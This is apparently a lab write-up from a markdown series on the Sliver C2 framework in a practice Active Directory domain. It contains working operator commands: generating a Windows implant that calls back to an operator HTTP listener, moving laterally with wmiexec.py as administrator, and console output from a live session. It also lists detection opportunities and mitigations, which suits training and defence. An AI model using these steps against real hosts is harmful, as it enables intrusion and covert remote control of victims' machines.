# Sliver Infrastructure and Initial Session

## Objective

This phase established a Sliver listener, generated a Windows implant, and validated an interactive session on a compromised host.

## Server setup

Sliver was installed on the Kali operator system and started locally. An HTTP implat was generated for Windwos x64 wiht a callback to the lab address `10.4.10.99`:

```bash
generate --http 10.4.10.99 --save /home/Documents/sliver/ --format exe

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 32s
[*] Implant saved to /home/kali/Documents/sliver/EXTRAORDINARY_STOCK-IN-TRADE.exe
```

Then `wmiexec.py` was used to upload hte file to `WINTERFELL`:

```bash
wmiexec.py -k -no-pass north.sevenkingdoms.local/administrator@winterfell
```

Then a `http` listener was started in `Sliver`:

```bash
[*] Starting HTTP :80 listener ...
[*] Successfully started job #1
```

After the executable in Windows has been run, the session was created on Sliver:

```bash
[*] Session 132db8b2 EXTRAORDINARY_STOCK-IN-TRADE - 10.4.10.11:57844 (winterfell) - windows/amd64 - Mon, 13 Jan 2025 19:46:22 CET

sliver > sessions

 ID         Name                           Transport   Remote Address     Hostname     Username             Operating System   Locale   Last Message                            Health
========== ============================== =========== ================== ============ ==================== ================== ======== ======================================= =========
 132db8b2   EXTRAORDINARY_STOCK-IN-TRADE   http(s)     10.4.10.11:57844   winterfell   NORTH\eddard.stark   windows/amd64      en-US    Mon Jan 13 19:46:26 CET 2025 (2s ago)   [ALIVE]
 ```

 Now, after selecting the session, the access was verified:

 ```bash
 sliver (EXTRAORDINARY_STOCK-IN-TRADE) > whoami

Logon ID: NORTH\eddard.stark
```

## Result

- The listener was reachable from the lab system
- A Windows x64 implant established a working session
- Host identity, transport, and session metadata were visible in the Sliver console

## Security impact

A working C2 session centralises RCE, data collection, and post-exploitation tooling. The risk comes not only from the implant binary but also from the enrypted or encoded network channel and the operator's ability to load extensions into the session.

## Detection opportunities

- New executable file written to user or temporary directories
- Outbound HTTP connections to uncomon internal hosts
- Repeated beacon or session traffic with unusual timing and content
- Parent-child process relationships associated with remote execution
- Remote WMI activity before implant execution

## Mitigation

- Restrict remote administrative protocols to approved management systems
- Use application control and endpoint protection to block unknown binaries
- Monitor internal egress, not only internet-bound traffic
- Correlate WMI execution, file creation, and ndew outbound connections
- Segment administrative systems from ordinary servers

## Navigation

[Sliver index](README.md) | [Next: Host and domain discovery](02-host-and-domain-discovery.md)
